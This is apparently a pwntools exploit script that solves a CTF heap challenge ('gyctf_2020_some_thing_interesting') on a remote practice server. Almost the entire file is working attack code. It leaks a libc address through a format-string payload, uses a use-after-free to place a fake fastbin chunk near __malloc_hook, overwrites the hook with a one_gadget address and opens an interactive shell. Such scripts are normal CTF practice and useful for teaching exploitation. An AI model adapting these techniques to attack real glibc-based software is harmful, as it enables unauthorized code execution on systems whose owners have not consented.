from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./gyctf_2020_some_thing_interesting"], env={"LD_PRELOAD":libc_path})
# p = process([ld_path, ""])
# p = process("", env={"LD_PRELOAD":libc_path})
# p = process("")
p = remote("node4.buuoj.cn", 28113)

# context.log_level = "debug"

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()


def check():
    sla("what you want to do :", "0")

def add(o_len, o_con, r_len, r_con):
    sla("what you want to do :", "1")
    sla("> O's length : ", str(o_len))
    sa("> O : ", o_con)
    sla("> RE's length : ", str(r_len))
    sa("> RE : ", r_con)

def edit(index, o_con, r_con):
    sla("what you want to do :", "2")
    sla("> Oreo ID : ", str(index))
    sa("> O : ", o_con)
    sa("> RE : ", r_con)

def free(index):
    sla("what you want to do :", "3")
    sla("> Oreo ID : ", str(index))

def show(index):
    sla("what you want to do :", "4")
    sla("> Oreo ID : ", str(index))


# fmt + uaf

# leak libc
code = b"OreOOrereOOreO"+b"%3$p"
sa("> Input your code please:", code)
check()
rud("0x")
info = int(rud("\n"), 16)
print("leak: ", hex(info))

# count
libc = ELF(libc_path)
base = info-libc.sym["write"]-16
print("base: ", hex(base))
malloc_hook = base+libc.sym["__malloc_hook"]
print("malloc_hook: ", hex(malloc_hook))
oneshot = base+0xf1147 

# alter malloc_hook to oneshot
add(0x60, "a", 0x10, "a")
free(1)
edit(1, p64(malloc_hook-0x23), "a")
add(0x60, "a", 0x60, cyclic(0x13)+p64(oneshot))

# attack
sla("what you want to do :", "1")
sla("> O's length : ", str(0x10))

shell()


